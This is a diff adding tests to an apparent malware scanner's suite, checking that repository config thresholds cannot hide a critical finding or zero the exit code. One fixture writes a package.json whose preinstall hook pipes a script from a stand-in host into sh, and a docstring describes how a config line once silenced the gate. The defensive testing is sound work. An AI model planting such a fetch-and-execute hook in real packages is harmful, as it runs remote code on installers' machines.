@@ -19,13 +19,14 @@ cases below produced silence and exit code 0.
 from __future__ import annotations
 
 import sys
+from dataclasses import replace
 
 import pytest
 
 from cordon import Scanner
 from cordon.core.config import Config, ConfigResolver, OrgConstraints
 from cordon.core.errors import ConfigError, ExitCode
-from cordon.core.models import Category, Severity
+from cordon.core.models import Category, Confidence, Severity
 from cordon.core.policy import PolicyGate
 
 PAYLOAD = (
@@ -553,3 +554,88 @@ class TestLimitsAsAnExclusion:
         config = Config.default()
         config = config.with_overrides(use_cache=False, limits=config.limits.merged(max_files=5))
         assert "POLICY.CONFIG.LIMIT_REDUCED" not in rule_ids(Scanner(config).scan(root))
+
+
+class TestThresholdsCannotWeakenTheGate:
+    """Fourth adversarial pass, and the most serious finding of the review.
+
+    `filter_for_reporting` runs inside the scan, so the failure gate only ever
+    saw the findings that survived it. One line in a repository's own
+    configuration therefore hid a CRITICAL malware finding about that repository
+    from the report *and* from the exit code:
+
+        scan:
+          confidence_threshold: confirmed
+
+    The build went green over a fetch-and-execute preinstall hook. The docstring
+    on that method asserted the opposite -- that the gate had already run and
+    could not be weakened -- which is why nothing caught it.
+    """
+
+    MALICIOUS_MANIFEST = (
+        '{"name":"evil","version":"1.0.0",'
+        '"scripts":{"preinstall":"curl http://evil.test/s.sh | sh"}}'
+    )
+
+    def build(self, tmp_path, config_text: str):
+        root = tmp_path / "r"
+        root.mkdir()
+        (root / "package.json").write_text(self.MALICIOUS_MANIFEST)
+        (root / "cordon.yaml").write_text(config_text)
+        return root
+
+    def test_a_confidence_threshold_cannot_hide_malware(self, tmp_path) -> None:
+        root = self.build(tmp_path, "scan:\n  confidence_threshold: confirmed\n")
+        assert "MALWARE.INSTALL.FETCH_EXEC.001" in rule_ids(scan(root))
+
+    def test_a_confidence_threshold_cannot_zero_the_exit_code(self, tmp_path) -> None:
+        root = self.build(tmp_path, "scan:\n  confidence_threshold: confirmed\n")
+        config = ConfigResolver.resolve(root=root).with_overrides(use_cache=False)
+        verdict = PolicyGate.evaluate(Scanner(config).scan(root), config.policy)
+        assert verdict.exit_code is ExitCode.FINDINGS
+
+    def test_a_severity_threshold_cannot_hide_what_fails_the_build(self, tmp_path) -> None:
+        root = tmp_path / "r"
+        root.mkdir()
+        (root / "p.js").write_text(PAYLOAD)
+        (root / "cordon.yaml").write_text("scan:\n  severity_threshold: critical\n")
+        config = ConfigResolver.resolve(root=root).with_overrides(use_cache=False)
+        result = Scanner(config).scan(root)
+        assert "SUSPECT.DECODE_EXEC.001" in {f.rule_id for f in result.findings}
+        assert PolicyGate.evaluate(result, config.policy).exit_code is ExitCode.FINDINGS
+
+    def test_both_thresholds_together_cannot_hide_it(self, tmp_path) -> None:
+        root = self.build(
+            tmp_path,
+            "scan:\n  severity_threshold: critical\n  confidence_threshold: confirmed\n",
+        )
+        assert "MALWARE.INSTALL.FETCH_EXEC.001" in rule_ids(scan(root))
+
+    def test_a_threshold_still_hides_what_does_not_fail_the_build(self, tmp_path) -> None:
+        """The exemption has to be exactly as wide as the gate and no wider, or
+        the thresholds stop working and people remove the tool instead."""
+        root = tmp_path / "r"
+        root.mkdir()
+        (root / "p.js").write_text(PAYLOAD)
+        config = Config.default().with_overrides(
+            use_cache=False,
+            severity_threshold=Severity.CRITICAL,
+            confidence_threshold=Confidence.CONFIRMED,
+        )
+        # fail_on defaults to high; raise it so nothing here trips the gate.
+        config = config.with_overrides(
+            policy=replace(config.policy, fail_on_severity=Severity.CRITICAL)
+        )
+        result = Scanner(config).scan(root)
+        assert "SUSPECT.DECODE_EXEC.001" not in {f.rule_id for f in result.findings}
+
+    def test_the_report_always_explains_a_non_zero_exit(self, tmp_path) -> None:
+        """The property underneath all of this. A pipeline that fails and prints
+        nothing about why gets a `|| true` appended to it."""
+        root = self.build(tmp_path, "scan:\n  confidence_threshold: confirmed\n")
+        config = ConfigResolver.resolve(root=root).with_overrides(use_cache=False)
+        result = Scanner(config).scan(root)
+        verdict = PolicyGate.evaluate(result, config.policy)
+        assert verdict.exit_code is not ExitCode.CLEAN
+        reported = {f.fingerprint for f in result.findings}
+        assert all(f.fingerprint in reported for f in verdict.triggering)
